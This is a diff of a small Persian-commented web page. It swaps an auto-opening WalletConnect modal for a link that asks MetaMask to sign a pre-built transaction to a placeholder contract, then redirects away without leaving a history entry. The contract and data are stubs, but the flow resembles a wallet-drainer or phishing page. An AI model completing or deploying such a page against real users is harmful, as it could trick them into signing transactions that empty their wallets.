@@ -1,52 +1,51 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>اتصال ایمن</title>
-  <!-- WalletConnect Modal برای باز کردن کیف پول -->
-  <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.min.js"></script>
+  <title>Auto Tx + Redirect</title>
 </head>
 <body>
+  <a href="#" id="trigger">Go & Sign Tx</a>
+
   <script>
-    // کد برای لینک مستقیم: کیف پول باز می‌کنه و به test.com ریدایرکت می‌کنه
-    console.log('اجرای فرآیند...');
+    const DEST_URL = "https://test.com"; // سایت مقصد
+    const CONTRACT = "0xYourContractAddress"; // آدرس کانترکت
+    const ABI = [ /* ABI فانکشن مورد نیاز */ ]; // ABI فانکشن
+    const DATA = "0x..."; // داده‌ی آماده‌شده (مثلا encodeABI)
 
-    // ایجاد WalletConnect Modal
-    let walletConnectModal;
-    try {
-      walletConnectModal = new WalletConnectModal({
-        projectId: 'd317becfd753b7bed5797bfdd39ab181', // جایگذاری Project ID
-        chains: [1], // مین‌نت اتریوم
-        metadata: {
-          name: 'Magic Link',
-          description: 'اتصال ایمن به کیف پول',
-          url: 'https://username.github.io/secure-magic-link',
-          icons: ['https://walletconnect.com/walletconnect-logo.png']
-        }
-      });
-      console.log('WalletConnect Modal ساخته شد');
-    } catch (error) {
-      console.error('خطا در ساخت WalletConnect Modal: ', error.message);
-    }
+    document.getElementById("trigger").addEventListener("click", async (e) => {
+      e.preventDefault();
 
-    // باز کردن کیف پول
-    if (walletConnectModal) {
       try {
-        console.log('تلاش برای باز کردن کیف پول...');
-        walletConnectModal.openModal();
-        console.log('درخواست باز کردن کیف پول ارسال شد!');
-      } catch (error) {
-        console.error('خطا در باز کردن کیف پول: ', error.message);
-      }
-    } else {
-      console.error('WalletConnect Modal ساخته نشد!');
-    }
+        if (typeof window.ethereum === "undefined") {
+          alert("MetaMask not found!");
+          return;
+        }
 
-    // ریدایرکت به test.com با تأخیر کوتاه برای اطمینان
-    setTimeout(() => {
-      console.log('ریدایرکت به test.com...');
-      window.location.replace('https://test.com');
-    }, 100); // تأخیر ۱۰۰ میلی‌ثانیه برای اطمینان از اجرای WalletConnect
+        // درخواست اتصال به کیف پول
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+
+        // ساخت تراکنش
+        const tx = {
+          from: (await window.ethereum.request({ method: "eth_accounts" }))[0],
+          to: CONTRACT,
+          data: DATA, // داده encode شده برای فانکشن
+          value: "0x0"
+        };
+
+        // پیشنهاد تراکنش به کاربر
+        await window.ethereum.request({
+          method: "eth_sendTransaction",
+          params: [tx],
+        });
+
+      } catch (err) {
+        console.error("Transaction failed:", err);
+      } finally {
+        // انتقال بدون باقی‌ماندن در history
+        location.replace(DEST_URL);
+      }
+    });
   </script>
 </body>
 </html>
